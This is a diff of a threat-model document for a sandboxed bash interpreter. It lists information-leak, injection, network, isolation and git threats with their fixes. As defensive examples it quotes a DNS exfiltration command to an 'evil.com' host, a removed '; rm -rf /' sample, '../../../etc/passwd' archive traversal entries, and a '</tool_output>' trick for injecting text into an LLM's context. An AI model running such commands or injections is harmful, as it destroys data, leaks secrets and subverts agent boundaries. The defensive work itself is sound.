+| TM-INF-024 | Host env side-channel via clap `Arg::env(...)` | uutils-ported clap builtins (currently `ls`: `.env("TABSIZE")`/`.env("TIME_STYLE")`) resolved defaults from `std::env`, not `ctx.env` — (1) presence-probe of host env vars via `ls` behaviour; (2) a host-set `TIME_STYLE` became a value source for an unimplemented option, tripping the unsupported-option gate on every plain `ls` for unrelated tenants | Four-layer fix: (1) codegen — `bashkit-coreutils-port` strips runtime `.env(...)` calls and emits a sidecar `<UTIL>_ENV_DEFAULTS: &[EnvDefault]` table per stripped annotation; (2) virtual-env shim — `crate::builtins::clap_env::apply_env_defaults` rewrites argv from `ctx.env` (never `std::env`) before `try_get_matches_from`, emulating clap's "argv > env > default" precedence; (3) static guards — `no_clap_env_in_generated_parsers` forbids runtime `.env(` in `generated/*.rs`; `every_generated_parser_emits_env_defaults_table` enforces the sidecar on every util; (4) defence-in-depth — workspace `clap` drops the `env` cargo feature, so a re-introduced `.env(...)` fails to compile. Coverage: `ls_ignores_host_time_style_and_tabsize` (host env ignored) and `ls_honors_virtual_env_time_style` (virtual env honoured) | **FIXED** |
+| TM-INF-025 | Untrusted generated Rust runs in drift CI with repository write token | The coreutils argument-drift workflow regenerates Rust from third-party `uutils/coreutils` `uu_app()` then builds/tests bashkit; if the generator preserved arbitrary upstream statements and the job held `contents: write`/`pull-requests: write`, malicious upstream code could execute with repository write impact | Two-layer fix: (1) `bashkit-coreutils-port` validates args-mode `uu_app()` before emission — accepts only a single tail clap `Command` builder chain, or `let <ident> = Command::new(...)<chain>; <ident>.<method>(...)<chain>` with the tail chained off the let-bound ident; both shapes pass a disallowed-method/closure/macro/block visitor. Regression tests `rejects_executable_statements_in_uu_app`, `rejects_let_with_non_command_initializer`, `rejects_tail_not_chained_off_let_binding`, `rejects_three_statement_body`. (2) `.github/workflows/coreutils-args-drift.yml` separates privilege: regeneration/build/test runs with `contents: read` + `persist-credentials: false`; the `open-pr` job has write permission but never builds or executes generated Rust, only commits the tested artifact | **FIXED** |
+| TM-INF-026 | Fork-PR secret exfiltration via approved CI run | GitHub's first-time-contributor gate runs the workflow **from the PR head**, and approved contributors auto-run thereafter. The `examples` job in `ci.yml` set `DOPPLER_TOKEN` at job level and `ANTHROPIC_API_KEY` at step level, so a fork PR could edit any `examples/*.rs`/`build.rs`/script the job runs and exfiltrate. `DOPPLER_TOKEN` is the master key — it fetches every other secret in the Doppler config, so one leak compromises all. Every `doppler run --` also injected the entire config into the step env | Three-layer fix in `.github/workflows/ci.yml`, `js.yml`, `publish-js.yml`: (1) fork guard — secret-using steps gate on `github.event.pull_request.head.repo.fork != true`; (2) step-scoped secrets — no job-level `env: DOPPLER_TOKEN`, each step sets only what it needs; (3) least-privilege injection — every `doppler run` uses `--only-secrets <KEY>`. Also migrated `ANTHROPIC_API_KEY` onto Doppler so `DOPPLER_TOKEN` is the only secret CI needs from GitHub | **FIXED** |
+| TM-INF-027 | Package publish from unverified release refs | A user with Actions/write privileges could dispatch release/publish workflows from a branch or unprotected `vX.Y.Z` tag; `release.yml` dispatches downstream workflows with `--ref "$TAG"`, and `publish-js.yml` treated stable `package.json` semver as `latest` even on non-tag refs — an attacker-controlled ref could source official crates.io/npm/PyPI/CLI/Homebrew artifacts | Release dispatches require full ref `refs/heads/main`; `release.yml` verifies the source is reachable from `origin/main` and the created tag resolves to the current `GITHUB_SHA` before dispatching; `publish.yml` rejects manual runs unless `GITHUB_REF` is a stable release tag matching `Cargo.toml` on a main-reachable commit; `publish-js.yml` requires main-reachable commit, assigns npm `latest` only for stable `vX.Y.Z` tag refs matching `package.json`; `publish-python.yml` applies the same main-reachable stable-tag + Cargo version gates; `cli-binaries.yml` accepts only stable `vX.Y.Z` inputs and verifies workflow ref = tag = `Cargo.toml` version on a main-reachable commit before building/uploading or updating Homebrew | **FIXED** |
+| TM-INF-028 | JS `onOutput` callback errors expose host stack traces | When a caller-supplied `onOutput` callback throws, `toNativeOnOutput` in `wrapper.ts` propagated `error.stack` (host file paths, internal function names) across the sandbox boundary; script output is attacker-controlled and drives the callback, so an attacker could trigger a throw and read host deployment paths | Propagate `error.message` only; regex-strip absolute-path and `file://` segments (guards attacker-controlled message injection); cap at 256 chars. Regression test `onOutput error does not leak stack trace or host paths` in `__test__/streaming-output.spec.ts`; mitigation annotated `// THREAT[TM-INF-028]` in `wrapper.ts` | **FIXED** |
+| TM-INF-030 | Raw callback errors leak host internals through ScriptedTool/ToolImpl | Tool callbacks may throw errors containing API keys, connection strings, or stack traces; output is attacker-influenced and agent-visible | `sanitize_errors` defaults to true on both `ScriptedTool` and `ToolImpl` (which can be registered directly as a Builtin); generic message replaces raw error (`scripted_tool/mod.rs`, `tool_def.rs`) | **MITIGATED** |
+| TM-INF-031 | `final_env` capture bypasses output filtering and size caps | When `capture_final_env` is enabled, env contents are a user-visible output channel that could leak internal markers or exceed output limits | Visibility filtering + output-byte cap applied when building `final_env` (`interpreter/mod.rs`) | **MITIGATED** |
 
-**TM-INF-022**: Generalizes TM-INF-016 to cover the whole builtin surface.
-The originating bug was `builtins/jq/` formatting jaq's compile/parse
-errors with `{:?}`, leaking the jaq `File` struct, the prepended compat-
-defs source we splice into every filter, and the raw `Undefined::Filter(N)`
-variant tags. Fix: replaced `{:?}` with custom `format_jq_compile_errors`
-/ `format_jq_load_errors` that emit short jq-style messages
-(`<name>/<arity> is not defined`), capped at 1 KB. Generalized to all
-builtins via the static + dynamic + fuzz guards described above. New
-builtins that wrap library errors must use Display (`{}`) or a domain-
-specific formatter — see `format_compile_errors` in `builtins/jq/errors.rs`
-as the reference shape.
+**TM-INF-022**: Generalizes TM-INF-016 to the whole builtin surface. Originating bug:
+`builtins/jq/` formatted jaq compile/parse errors with `{:?}`, leaking the jaq `File`
+struct, the prepended compat-defs source, and raw `Undefined::Filter(N)` tags. Fixed via
+`format_jq_compile_errors` / `format_jq_load_errors` (short jq-style messages, ≤ 1 KB),
+then generalized via the static + dynamic + fuzz guards in the table. New builtins wrapping
+library errors must use Display (`{}`) or a domain formatter — reference shape:
+`format_compile_errors` in `builtins/jq/errors.rs`.
 
 The fuzz layer also catches three sister threats with the same
 machinery (`bashkit::testing::assert_fuzz_invariants`):
@@ -495,27 +415,18 @@ machinery (`bashkit::testing::assert_fuzz_invariants`):
   (1 KB) — one bad input that produces 10 MB of library-error spam
   trips this.
 
-Fuzz/proptest targets inline arbitrary input bytes into shell scripts,
-so bash, ls, and uutils clap CLIs produce error messages that quote the
-input verbatim (`bash: <cmd>: command not found`, `bash: <path>: No such
-file or directory`, `ls: cannot access '<path>': …`,
-`error: unexpected argument '<input>' found`,
-`  tip: to pass '<input>' as a value, use '-- <input>'`,
-`Usage: ls [OPTION]... [FILE]...`,
-`For more information, try '--help'.`). Those echoes can accidentally
-form a banned substring — e.g. user input `Tok"` becomes the command
-name `Tok:`, and bash's `bash: %s: command not found` formatter renders
-it as `bash: Tok:: command not found`, matching the parser-token shape
-`Tok::`; or user input `--i{fi/rustc/fi{{RRi` lands in clap's
-`error: unexpected argument '…' found` chrome and trips the `/rustc/`
-host-path check. They are not internal Debug leaks. To keep the leak
-detector strict on real internals while suppressing this class of false
-positive, `assert_fuzz_invariants` strips lines that match a recognized
-real-shell or clap error template before the banned-shape check; the
-byte-length cap and the host-canary check still run on the unfiltered
-stderr so flood and TM-INF-013 regressions are still caught. The strict
-per-builtin path (`assert_no_leak`) is unchanged — non-fuzz tests must
-not produce shell echoes in the first place.
+Fuzz/proptest targets inline arbitrary input bytes into shell scripts, so bash/ls/uutils
+clap CLIs echo the input verbatim in error chrome (`bash: <cmd>: command not found`,
+`error: unexpected argument '<input>' found`, usage/tip lines, …). Those echoes can
+accidentally form a banned substring — e.g. input `Tok"` renders as
+`bash: Tok:: command not found`, matching the parser-token shape `Tok::`; or input
+containing `/rustc/` lands in clap's quoted-argument chrome and trips the host-path
+check. These are not internal Debug leaks. To keep the detector strict on real internals
+while suppressing this false-positive class, `assert_fuzz_invariants` strips lines
+matching a recognized real-shell or clap error template before the banned-shape check;
+the byte-length cap and host-canary check still run on the unfiltered stderr, so flood
+and TM-INF-013 regressions are still caught. The strict per-builtin path
+(`assert_no_leak`) is unchanged — non-fuzz tests must not produce shell echoes at all.
 
 **TM-INF-013**: The jq builtin previously called `std::env::set_var()` to expose
 shell variables to jaq's `env` function. This also made host process env vars (API keys, tokens)
@@ -523,17 +434,16 @@ visible. Additionally, `set_var` is thread-unsafe (unsound in Rust 2024 edition)
 `env` def in `builtins/jq/compat.rs` reads from a `$__bashkit_env__` global wired up in
 `builtins/jq/mod.rs` from `ctx.env`/`ctx.variables`.
 
-**TM-INF-014**: `$$` (`interpreter/mod.rs:7615`) returns `std::process::id()`, leaking the real
-host PID. All other system builtins return virtual values. Fix: return fixed or random value.
+**TM-INF-014**: `$$` previously returned `std::process::id()` (real host PID); now returns
+virtual PID — see table.
 
-**TM-INF-015**: `network/allowlist.rs:144` echoes full URL in error messages, potentially including
-`user:pass@` in the authority. Fix: apply `LogConfig::redact_url()` to URLs in errors.
+**TM-INF-015**: see table — allowlist "blocked" errors previously echoed `user:pass@` URLs.
 
-**TM-INF-016**: Multiple error paths leak internal details: `error.rs:38` wraps `std::io::Error`
-(may include host paths), `network/client.rs:224` wraps reqwest errors (resolved IPs, TLS info),
-`git/client.rs` includes VFS paths and remote URLs, `scripted_tool/execute.rs:323` uses `{:?}`
-(Debug format) while `BashTool` uses `error_kind()` — inconsistent. Fix: use Display format
-consistently, wrap external errors with sanitized messages.
+**TM-INF-016**: multiple error paths leaked internals — `error.rs` wrapped `std::io::Error`
+(host paths), `network/client.rs` wrapped reqwest errors (resolved IPs, TLS info),
+`git/client.rs` included VFS paths/remote URLs, `scripted_tool/execute.rs` used `{:?}` while
+`BashTool` used `error_kind()`. Fixed: consistent Display format; external errors wrapped with
+sanitized messages (`sanitize_error_message()`, `Error::network_sanitized()`).
 
 **Current Risk**: MEDIUM - Caller must sanitize environment variables; jq leaks host env
 
@@ -560,21 +470,9 @@ Bash::builder()
 | TM-INF-008 | System info | `uname -a` | Returns configurable virtual values | **MITIGATED** |
 | TM-INF-009 | User ID | `id` | Returns hardcoded uid=1000 | **MITIGATED** |
 
-**Current Risk**: NONE - System builtins return configurable virtual values (never real host info)
-
-**Implementation**: `builtins/system.rs` provides configurable system builtins:
-- `hostname` → configurable (default: "bashkit-sandbox")
-- `uname` → hardcoded Linux 5.15.0 / configurable hostname
-- `whoami` → configurable (default: "sandbox")
-- `id` → uid=1000(configurable) gid=1000(configurable)
-
-**Configuration**:
-```rust
-Bash::builder()
-    .username("deploy")      // Sets whoami, id, and $USER env var
-    .hostname("my-server")   // Sets hostname, uname -n
-    .build();
-```
+**Current Risk**: NONE. Implementation: `builtins/system.rs` — `hostname` (default
+"bashkit-sandbox"), `uname` (hardcoded Linux 5.15.0), `whoami` (default "sandbox"),
+`id` (uid/gid 1000), all configurable via `Bash::builder().username(..).hostname(..)`.
 
 #### 3.3 Network Exfiltration
 
@@ -608,44 +506,29 @@ Bash::builder()
 | TM-INJ-020 | `declare` overwrites readonly variables | `readonly X=v; declare X=new` overwrites without error | `declare` assignment path consults `VarAttrs::READONLY` via `is_var_readonly()`, emits `bash: declare: <name>: readonly variable`, returns exit 1 | **MITIGATED** |
 | TM-INJ-021 | `export` overwrites readonly variables | `readonly X=v; export X=new` overwrites without error | `export NAME=VALUE` consults `VarAttrs::READONLY` via `ShellRef::is_var_readonly()`, emits `bash: export: <name>: readonly variable`, returns exit 1 | **MITIGATED** |
 | TM-INJ-022 | XML boundary break via tool output (`sanitizeOutput`) | When `sanitizeOutput` is enabled the JS adapters (anthropic, openai) wrap tool output in `<tool_output>…</tool_output>` markers. A script that emits `</tool_output>` in its stdout can close the marker early and inject arbitrary text into the LLM context, bypassing the boundary | Escape `&`, `<`, `>` in content before inserting between tags (`anthropic.ts`, `openai.ts` `formatOutput`). Tests: `ai-adapters.spec.ts` — "sanitizeOutput escapes </tool_output> in stdout" and "sanitizeOutput escapes & < > in stdout" for both adapters | **FIXED** |
+| TM-INJ-023 | Template injection via `#each` data values | `template` builtin: data values containing template markers (`{{`, `#each`) could be re-expanded as directives when interpolated | Template markers escaped in data values before interpolation (`builtins/template.rs`) | **MITIGATED** |
 
 **TM-INJ-011** (mitigated): `interpreter/mod.rs::resolve_nameref` tracks visited names in a
-`HashSet`. When a cycle (e.g. `a→b→a`, `a→a`, or longer chains) is detected on the next hop,
-the resolver returns the original name and breaks the loop, so `${a}` looks up the (unset)
+`HashSet`; on cycle detection it returns the original name, so `${a}` looks up the (unset)
 top-level variable rather than infinite-recursing. We do not emit Bash's exact
 `circular name reference` warning, but the safety property — no hang, no stack overflow, no
 silent traversal to a stale variable — is upheld. Regression tests:
 `tests/threat_model_tests.rs::tm_inj_011_*`.
 
-**TM-INJ-018** (mitigated): `builtins/dotenv.rs:138` — `Dotenv::execute` calls
-`is_internal_variable(&full_key)` and skips any key in the historically-reserved namespace
-(`_NAMEREF_*`, `_READONLY_*`, `_UPPER_*`, `_LOWER_*`, `_INTEGER_*`, `_ARRAY_READ_*`,
-`_SHIFT_COUNT`, `_SET_POSITIONAL`). The interpreter no longer stores attribute markers in
-`variables` under these prefixes — readonly/integer/lower/upper attributes live in a
-dedicated `VarAttrs` bitset map and namerefs in a dedicated `namerefs: HashMap<String, String>`
-— so even a dotenv key that slipped past the filter could not influence interpreter behavior.
-The prefix block is kept as defense-in-depth (and to suppress confusing output like
-`echo $_NAMEREF_x`). Regression test: `tests/threat_model_tests.rs::tm_inj_018_dotenv_rejects_internal_prefixes`.
-
-**TM-INJ-009** (mitigated): historically the interpreter used magic variable prefixes
-(`_NAMEREF_<name>`, `_READONLY_<name>`, `_INTEGER_<name>`, `_UPPER_<name>`, `_LOWER_<name>`)
-to record attributes inside the shared `variables` HashMap. That allowed user scripts to
-forge attributes by writing the prefixed key directly. The interpreter now stores
-attributes in a dedicated `var_attrs: HashMap<String, VarAttrs>` bitset and namerefs in a
-dedicated `namerefs` map; user scripts cannot reach these from bash. `is_internal_variable()`
-still rejects writes to the legacy prefixes from every write path (`set_variable`, `read`,
-`printf -v`, `local`, `declare`, `readonly`, `export`, `dotenv`, `unset`) as
-defense-in-depth, and `set` / `declare -p` filter the prefixes from listings (TM-INF-017).
-Regression tests live in `tests/security_audit_pocs.rs` (declare/readonly/export/local can
-not inject any of the legacy markers) and `tests/threat_model_tests.rs::tm_inj_009_*`.
-
-**Example**:
-```bash
-# User provides: "; rm -rf /"
-user_input="; rm -rf /"
-echo $user_input
-# Output: "; rm -rf /" (literal string, not executed)
-```
+**TM-INJ-009 / TM-INJ-018** (mitigated): historically the interpreter recorded attributes via
+magic prefixes (`_NAMEREF_*`, `_READONLY_*`, `_INTEGER_*`, `_UPPER_*`, `_LOWER_*`,
+`_ARRAY_READ_*`, `_SHIFT_COUNT`, `_SET_POSITIONAL`) inside the shared `variables` HashMap,
+letting scripts (or `.env` files) forge attributes by writing the prefixed key directly.
+Attributes now live in a dedicated `var_attrs: HashMap<String, VarAttrs>` bitset and namerefs
+in a dedicated `namerefs` map, unreachable from bash — so even a key slipping past the filter
+could not influence interpreter behavior. `is_internal_variable()` still rejects the legacy
+prefixes on every write path (`set_variable`, `read`, `printf -v`, `local`, `declare`,
+`readonly`, `export`, `dotenv` at `builtins/dotenv.rs:138`, `unset`) as defense-in-depth (and
+to suppress confusing `echo $_NAMEREF_x` output), and `set` / `declare -p` filter them from
+listings (TM-INF-017). Regression tests: `tests/security_audit_pocs.rs`
+(declare/readonly/export/local cannot inject legacy markers),
+`tests/threat_model_tests.rs::tm_inj_009_*`, and
+`tests/threat_model_tests.rs::tm_inj_018_dotenv_rejects_internal_prefixes`.
 
 #### 4.2 Path Injection
 
@@ -657,18 +540,12 @@ echo $user_input
 | TM-INJ-010 | Tar path traversal within VFS | `tar -xf` with `../../../etc/passwd` entry names | `archive.rs` rejects entries whose absolute name escapes the extract base or whose resolved path doesn't `starts_with(&extract_base)`, returning `tar: <name>: path traversal blocked` and exit 1 | **MITIGATED** |
 | TM-INJ-017 | Unzip path traversal within VFS | `unzip` with `../../../etc/passwd` entry names in custom BKZIP format | `zip_cmd.rs::validate_extract_entry_path` rejects any path component that is `ParentDir`, `RootDir`, `Prefix`, or `CurDir` and surfaces `unzip: invalid archive entry path: <name>` | **MITIGATED** |
 
-**TM-INJ-010** (mitigated): `builtins/archive.rs` validates each tar entry name against
-`extract_base` before any write. Entries starting with `/`, containing `..`, or whose
-`resolve_path(&extract_base, &name)` does not `starts_with(&extract_base)` are rejected
-with `tar: <name>: path traversal blocked` (exit 1, no file created). Regression tests:
+**TM-INJ-010** (mitigated): see table. Regression tests:
 `builtins::archive::tests::test_tar_extract_path_traversal_dotdot_blocked`,
-`…_absolute_blocked`, `…_dir_dotdot_blocked` (3 tests).
+`…_absolute_blocked`, `…_dir_dotdot_blocked`.
 
-**TM-INJ-017** (mitigated): `builtins/zip_cmd.rs::validate_extract_entry_path` walks the
-entry path's `Path::components()` and rejects anything that is not `Component::Normal`,
-including `..`, leading `/`, drive prefixes, and `.`. The unzip loop then surfaces
-`unzip: invalid archive entry path: <name>` with exit 1 and aborts the extract.
-Regression test: `builtins::zip_cmd::tests::test_unzip_rejects_path_traversal_entries`.
+**TM-INJ-017** (mitigated): see table. Regression test:
+`builtins::zip_cmd::tests::test_unzip_rejects_path_traversal_entries`.
 
 **Current Risk**: LOW - Rust's type system prevents most attacks; tar traversal is VFS-contained
 
@@ -681,12 +558,8 @@ Regression test: `builtins::zip_cmd::tests::test_unzip_rejects_path_traversal_en
 
 **Current Risk**: LOW - Bashkit does not render output itself; embedding UIs own display sanitization.
 
-**Caller Responsibility** (TM-INJ-007, TM-INJ-008): Escape or sanitize output before display:
-```rust
-let result = bash.exec(script).await?;
-let safe_html = html_escape(&result.stdout);
-let safe_output = sanitize_terminal_escapes(&result.stdout);
-```
+**Caller Responsibility** (TM-INJ-007, TM-INJ-008): HTML-escape and strip terminal escapes
+from `result.stdout`/`stderr` before display.
 
 ---
 
@@ -700,14 +573,8 @@ let safe_output = sanitize_terminal_escapes(&result.stdout);
 | TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` blocks private IPs at connect time | **MITIGATED** |
 | TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |
 
-**Current Risk**: NONE - Network allowlist uses literal host/IP matching, no DNS
-
-**Implementation**: `network/allowlist.rs` - `matches_pattern()` function
-```rust
-// Allowlist matches literal strings, not resolved IPs
-allowlist.allow("https://api.example.com");
-// "api.example.com" must match exactly - no DNS lookup
-```
+**Current Risk**: NONE. Implementation: `network/allowlist.rs::matches_pattern()` — allowlist
+matches literal host strings exactly, never resolved IPs; no DNS lookup.
 
 #### 5.2 Network Bypass
 
@@ -746,31 +613,10 @@ allowlist.allow("https://api.example.com");
 
 **Bot-auth signing** (feature `bot-auth`): When configured, all outbound HTTP requests from curl/wget/http builtins are transparently signed with Ed25519 per RFC 9421. Signing is non-blocking — failures send requests unsigned. See `specs/request-signing.md`.
 
-**Implementation**: `network/client.rs`
-```rust
-// Security defaults (TM-NET-008, TM-NET-009, TM-NET-010)
-const DEFAULT_MAX_RESPONSE_BYTES: usize = 10 * 1024 * 1024;  // 10MB
-const DEFAULT_TIMEOUT_SECS: u64 = 30;
-const MAX_TIMEOUT_SECS: u64 = 600;   // 10 min - prevents resource exhaustion
-const MIN_TIMEOUT_SECS: u64 = 1;     // Prevents instant timeouts
-const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
-
-// Redirects disabled by default (TM-NET-011, TM-NET-014)
-.redirect(reqwest::redirect::Policy::none())
-
-// Decompression disabled to prevent zip bombs (TM-NET-013)
-.no_gzip()
-.no_brotli()
-.no_deflate()
-
-// Ignore host proxy env vars (TM-NET-015)
-.no_proxy()
-
-// Response size checked during streaming (TM-NET-008, TM-NET-012)
-async fn read_body_with_limit(&self, response: Response) -> Result<Vec<u8>> {
-    // Streams response, checks size at each chunk
-}
-```
+**Implementation**: `network/client.rs` — `DEFAULT_MAX_RESPONSE_BYTES` 10MB, timeouts default
+30s / connect 10s, clamped to [1s, 10min] (TM-NET-008/009/010); `redirect(Policy::none())`
+(TM-NET-011/014); `.no_gzip().no_brotli().no_deflate()` (TM-NET-013); `.no_proxy()`
+(TM-NET-015); `read_body_with_limit()` streams and checks size per chunk (TM-NET-008/012).
 
 #### 5.4 HTTP Client Mitigations
 
@@ -797,56 +643,11 @@ async fn read_body_with_limit(&self, response: Response) -> Result<Vec<u8>> {
 #### 5.6 curl/wget Security Model
 
 **Request Flow**:
-```
-Script: curl https://api.example.com/data
-         │
-         ▼
-┌─────────────────────────────────────────┐
-│ 1. URL Allowlist Check (BEFORE network) │
-│    - Scheme match (https)               │
-│    - Host match (literal)               │
-│    - Port match (443 default)           │
-│    - Path prefix match                  │
-└─────────────────────────────────────────┘
-         │ Allowed?
-         │ No → Return "access denied" (exit 7)
-         │ Yes ↓
-┌─────────────────────────────────────────┐
-│ 2. Connect with Timeout (10s)           │
-│    - TCP connection                     │
-│    - TLS handshake                      │
-└─────────────────────────────────────────┘
-         │ Success?
-         │ No → Return "request failed" (exit 1)
-         │ Yes ↓
-┌─────────────────────────────────────────┐
-│ 3. Content-Length Check                 │
-│    - If header present, check < 10MB    │
-│    - If > 10MB, abort early             │
-└─────────────────────────────────────────┘
-         │ Size OK?
-         │ No → Return "response too large" (exit 63)
-         │ Yes ↓
-┌─────────────────────────────────────────┐
-│ 4. Stream Response with Size Limit      │
-│    - Read chunks                        │
-│    - Accumulate bytes                   │
-│    - Abort if total > 10MB              │
-└─────────────────────────────────────────┘
-         │ Complete?
-         │ No → Return "response too large" (exit 63)
-         │ Yes ↓
-┌─────────────────────────────────────────┐
-│ 5. Handle Redirect (if -L flag)         │
-│    - Extract Location header            │
-│    - Check EACH redirect URL against    │
-│      allowlist (go to step 1)           │
-│    - Max 10 redirects                   │
-└─────────────────────────────────────────┘
-         │
-         ▼
-     Return response to script
-```
+1. URL allowlist check BEFORE any network I/O — scheme, literal host, port, path prefix must match; deny → "access denied" (exit 7)
+2. Connect with timeout (10s TCP + TLS); failure → "request failed" (exit 1)
+3. Content-Length pre-check — header > 10MB aborts early ("response too large", exit 63)
+4. Stream response with size limit — abort if accumulated bytes > 10MB (exit 63)
+5. Redirects (only with `-L`): each Location URL re-checked against allowlist from step 1; max 10 redirects
 
 **Exit Codes**:
 - 0: Success
@@ -941,19 +742,13 @@ Only exact domain matches are allowed (TM-NET-017).
 | TM-ISO-023 | `set -e` leaks across `exec()` calls | `set` options (`-e`, `-x`, etc.) persist across `exec()` calls, causing unexpected abort behavior | `reset_transient_state()` clears `SET_OPTION_VARS` | **FIXED** |
 | TM-ISO-024 | `$?` leaks into VFS subprocess | Parent `last_exit_code` visible inside VFS script subprocess, causing false `set -e` failures | `execute_script_content()` sets `last_exit_code = 0`, clears `nounset_error`, and clears `traps` for the child | **MITIGATED** |
 
-**TM-ISO-004**: Fixed. The jq builtin now injects shell variables via a custom jaq context variable
-(`$__bashkit_env__`) and overrides the `env` filter to read from it instead of `std::env`.
-See `builtins/jq/compat.rs` and `builtins/jq/mod.rs` (env wiring).
+**TM-ISO-004**: Fixed — see table; env wiring in `builtins/jq/compat.rs` and `builtins/jq/mod.rs`.
 
-**TM-ISO-005**: `ExecutionCounters::reset_for_execution()` zeros all counters at each `exec()` entry.
-A tenant splitting work across many `exec()` calls gets unlimited aggregate commands, loop iterations,
-and CPU time. Fix: add session-level cumulative counters that persist across `exec()` calls within a
-`Bash` instance. See issue #655.
+**TM-ISO-005**: counters reset per `exec()`, so a tenant splitting work across many calls got
+unlimited aggregate resources. Fixed by `SessionLimits` (see table); issue #655.
 
-**TM-ISO-006**: Interpreter stores state in unbounded `HashMap` collections (`variables`, `arrays`,
-`assoc_arrays`, `functions`). A script can create millions of entries, consuming arbitrary heap memory
-and OOM-ing the process. Fix: add `MemoryLimits` with caps on variable count, total bytes, array
-entries, and function count/size. See issue #656.
+**TM-ISO-006**: unbounded `HashMap` growth (`variables`, `arrays`, `assoc_arrays`, `functions`)
+could OOM the process. Fixed by `MemoryLimits` (see table); issue #656.
 
 **Note**: `PROC_SUB_COUNTER` (`AtomicU64`) is a global monotonic counter for process substitution
 paths (`/dev/fd/proc_sub_N`). This is a minor timing side-channel (reveals approximate execution
@@ -962,19 +757,8 @@ session's isolated VFS.
 
 **Current Risk**: MEDIUM - cumulative resource bypass (TM-ISO-005) and memory exhaustion (TM-ISO-006)
 
-**Implementation**: Each session gets separate instance with isolated state:
-```rust
-// Each session gets isolated instance (TM-ISO-001 through TM-ISO-020)
-let session_a = Bash::builder()
-    .fs(Arc::new(InMemoryFs::new()))
-    .limits(session_limits)
-    .build();
-
-let session_b = Bash::builder()
-    .fs(Arc::new(InMemoryFs::new()))  // Separate FS
-    .limits(session_limits)
-    .build();
-```
+**Implementation**: each session is a separate `Bash::builder()` instance with its own
+`Arc<InMemoryFs>` and limits — no shared mutable state (TM-ISO-001 through TM-ISO-020).
 
 ---
 
@@ -989,36 +773,12 @@ let session_b = Bash::builder()
 | TM-INT-003 | Date format panic | Invalid strftime format causes chrono panic | Pre-validation with `StrftimeItems` | **MITIGATED** |
 | TM-INT-007 | `/dev/urandom` empty with `head -c` | `head -c 16 /dev/urandom` returns empty output; pipe from virtual device to builtin loses data | `read_file_for_builtin` (`builtins/mod.rs`) reads `/dev/urandom`/`/dev/random` as Latin-1 chars (each byte 0x00-0xFF maps 1:1 to a char) so `head -c N` returns N bytes of randomness in both the path-argument form and the `cat /dev/urandom \| head -c N` pipe form | **MITIGATED** |
 
-**Current Risk**: LOW - All builtin panics are caught and converted to sanitized errors
+**Current Risk**: LOW. Implementation: `interpreter/mod.rs` wraps every builtin call in
+`AssertUnwindSafe(..).catch_unwind()` (TM-INT-001) and converts panics to the sanitized
+`bash: <name>: builtin failed unexpectedly` error — never exposing panic details (TM-INT-002).
 
-**Implementation**: `interpreter/mod.rs` - Panic catching for all builtins:
-```rust
-// THREAT[TM-INT-001]: Builtins may panic on unexpected input
-let result = AssertUnwindSafe(builtin.execute(ctx)).catch_unwind().await;
-
-match result {
-    Ok(Ok(exec_result)) => exec_result,
-    Ok(Err(e)) => return Err(e),
-    Err(_panic) => {
-        // THREAT[TM-INT-002]: Panic message may contain sensitive info
-        // Return sanitized error - never expose panic details
-        ExecResult::err(format!("bash: {}: builtin failed unexpectedly\n", name), 1)
-    }
-}
-```
-
-**Date Format Validation** (TM-INT-003): `builtins/date.rs`
-```rust
-// THREAT[TM-INT-003]: chrono::format() can panic on invalid format specifiers
-fn validate_format(format: &str) -> Result<(), String> {
-    for item in StrftimeItems::new(format) {
-        if let Item::Error = item {
-            return Err(format!("invalid format string: '{}'", format));
-        }
-    }
-    Ok(())
-}
-```
+**Date Format Validation** (TM-INT-003): `builtins/date.rs::validate_format()` pre-validates
+strftime formats via `StrftimeItems`, rejecting `Item::Error` before `chrono::format()` can panic.
 
 #### 7.2 Error Message Safety
 
@@ -1050,17 +810,8 @@ security threats related to git operations and their mitigations.
 | TM-GIT-004 | Credential theft | Access git credential store | No host filesystem access | **MITIGATED** |
 | TM-GIT-005 | Repository escape | `git clone` outside VFS | All paths in VFS | **MITIGATED** |
 
-**Current Risk**: LOW - All git operations confined to virtual filesystem
-
-**Implementation**: `git/client.rs`
-```rust
-// THREAT[TM-GIT-002]: Host identity leak
-// Author identity is configurable, never reads from host ~/.gitconfig
-let config = format!(
-    "[user]\n\tname = {}\n\temail = {}\n",
-    self.config.author_name, self.config.author_email
-);
-```
+**Current Risk**: LOW. Implementation: `git/client.rs` — author identity (`[user]` name/email)
+is built from configurable `self.config` values, never read from host `~/.gitconfig` (TM-GIT-002).
 
 #### 8.2 Git-specific DoS
 
@@ -1083,11 +834,11 @@ let config = format!(
 | TM-GIT-013 | Git protocol bypass | Use git:// protocol | HTTPS only | **PLANNED** |
 
 | TM-GIT-014 | Branch name path injection | `branch_create(name="../../config")` overwrites `.git/config` via `Path::join()` | `git/client.rs::validate_ref_name` rejects refs containing `..`, leading `/`, control chars, or other path-injection patterns before any `Path::join` | **MITIGATED** |
+| TM-GIT-015 | Terminal-escape/control-char injection via stored git metadata | Config values, author names, and commit messages are echoed back by `git config`/`git log`; embedded control characters could inject terminal escapes into agent-visible output | Values sanitized to strip control characters on output (`git/client.rs` config read + `format_log`) | **MITIGATED** |
 
-**TM-GIT-014**: Branch names are used directly in `Path::join()` (`git/client.rs:1035, 1080, 1119`)
-without validation. A name like `../../config` can overwrite `.git/config` within the VFS. While
-confined to VFS, this can corrupt the virtual git repository. Fix: validate branch names against
-git's ref name rules (no `..`, no control chars, no trailing `.lock`).
+**TM-GIT-014**: branch names were used directly in `Path::join()` (`git/client.rs`), so
+`../../config` could overwrite `.git/config` (VFS-confined repo corruption). Fixed by
+`validate_ref_name` — see table.
 
 **Current Risk**: LOW for remote ops (not yet implemented); MEDIUM for local git name injection
 
@@ -1126,28 +877,12 @@ security threats related to logging and their mitigations.
 | TM-LOG-003 | URL credential leak | Log URLs with `user:pass@host` | URL credential redaction | **MITIGATED** |
 | TM-LOG-004 | API key detection | Log values that look like API keys/JWTs | Entropy-based detection | **MITIGATED** |
 
-**Current Risk**: LOW - Sensitive data is redacted by default
+**Current Risk**: LOW. Implementation: `LogConfig` (`logging.rs`) redacts by default —
+`should_redact_env()` matches PASSWORD/SECRET/TOKEN/KEY-style names, `redact_url()` strips
+`user:pass@` to `[REDACTED]@`, `redact_value()` detects API-key/JWT shapes by entropy.
 
-**Implementation**: `logging.rs` provides `LogConfig` with redaction:
-```rust
